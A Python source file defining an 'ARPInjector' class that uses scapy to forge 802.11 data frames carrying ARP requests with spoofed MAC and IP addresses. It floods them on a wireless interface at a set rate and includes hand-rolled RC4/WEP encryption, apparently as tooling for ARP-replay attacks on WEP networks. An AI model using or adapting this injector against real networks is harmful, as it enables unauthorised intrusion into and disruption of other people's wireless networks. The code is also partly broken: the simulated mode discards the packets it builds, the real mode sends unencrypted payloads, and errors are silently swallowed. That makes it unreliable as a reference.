import threading
import time
import random
from scapy.all import sendp, RadioTap, Dot11, LLC, SNAP, ARP, Raw


class ARPInjector:
    def __init__(self):
        self.is_injecting = False
        self.inject_thread = None
        self.stats = {
            'packets_sent': 0,
            'last_sent_time': None
        }
        self.lock = threading.Lock()
        self._secret_key = [0x1F, 0x2A, 0x3B, 0x4C, 0x5D]

    def _rc4_ksa(self, key):
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        return S

    def _rc4_prga(self, S, n):
        i = 0
        j = 0
        result = []
        S = S.copy()
        for _ in range(n):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(S[(S[i] + S[j]) % 256])
        return result

    def _encrypt_wep(self, iv, key, plaintext):
        full_key = list(iv) + key
        S = self._rc4_ksa(full_key)
        keystream = self._rc4_prga(S, len(plaintext) + 4)
        icv = self._compute_icv(plaintext)
        data_with_icv = plaintext + list(icv.to_bytes(4, 'little'))
        encrypted = [d ^ k for d, k in zip(data_with_icv, keystream)]
        return list(iv) + [0] + encrypted

    def _compute_icv(self, data):
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= byte
            for _ in range(8):
                if crc & 1:
                    crc = (crc >> 1) ^ 0xEDB88320
                else:
                    crc >>= 1
        return crc ^ 0xFFFFFFFF

    def _generate_arp_packet_simulated(self, bssid, target_mac):
        iv = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

        arp_plain = [
            0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00,
            0x08, 0x06,
            0x00, 0x01,
            0x08, 0x00,
            0x06, 0x04,
            0x00, 0x01,
            0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
            0xC0, 0xA8, 0x01, 0x01,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0xA8, 0x01, 0x64
        ]

        wep_data = self._encrypt_wep(iv, self._secret_key, arp_plain)

        pkt = RadioTap()
        pkt /= Dot11(
            type=2,
            subtype=0,
            addr1=bssid or 'FF:FF:FF:FF:FF:FF',
            addr2=target_mac or '00:11:22:33:44:55',
            addr3=bssid or 'FF:FF:FF:FF:FF:FF'
        )
        pkt /= Raw(load=bytes(wep_data))

        return pkt, iv

    def _inject_loop_simulated(self, interface, bssid, target_mac, rate, callback):
        while self.is_injecting:
            pkt, iv = self._generate_arp_packet_simulated(bssid, target_mac)
            self._send_packet_simulated(iv, callback)
            time.sleep(1.0 / rate)

    def _send_packet_simulated(self, iv, callback):
        with self.lock:
            self.stats['packets_sent'] += 1
            self.stats['last_sent_time'] = time.time()

        if callback:
            callback(iv, self.stats['packets_sent'])

    def _inject_loop_real(self, interface, bssid, target_mac, rate):
        try:
            from scapy.all import sendp, Dot11, LLC, SNAP, ARP

            while self.is_injecting:
                pkt = RadioTap()
                pkt /= Dot11(
                    type=2,
                    subtype=0,
                    addr1=bssid or 'FF:FF:FF:FF:FF:FF',
                    addr2=target_mac or '00:11:22:33:44:55',
                    addr3=bssid or 'FF:FF:FF:FF:FF:FF'
                )
                pkt /= LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
                pkt /= SNAP(OUI=0x000000, code=0x0806)
                pkt /= ARP(
                    op=1,
                    hwsrc='00:11:22:33:44:55',
                    psrc='192.168.1.1',
                    hwdst='00:00:00:00:00:00',
                    pdst='192.168.1.255'
                )

                try:
                    sendp(pkt, iface=interface, verbose=0)
                    with self.lock:
                        self.stats['packets_sent'] += 1
                        self.stats['last_sent_time'] = time.time()
                except:
                    pass

                time.sleep(1.0 / rate)
        except:
            pass

    def start_injection(self, interface='wlan0', bssid=None, target_mac=None, rate=10, use_simulated=True, callback=None):
        if self.is_injecting:
            return

        self.is_injecting = True
        self.stats['packets_sent'] = 0

        if use_simulated:
            self.inject_thread = threading.Thread(
                target=self._inject_loop_simulated,
                args=(interface, bssid, target_mac, rate, callback)
            )
        else:
            self.inject_thread = threading.Thread(
                target=self._inject_loop_real,
                args=(interface, bssid, target_mac, rate)
            )

        self.inject_thread.daemon = True
        self.inject_thread.start()

    def stop_injection(self):
        self.is_injecting = False
        if self.inject_thread:
            self.inject_thread.join(timeout=2)

    def get_stats(self):
        with self.lock:
            return self.stats.copy()
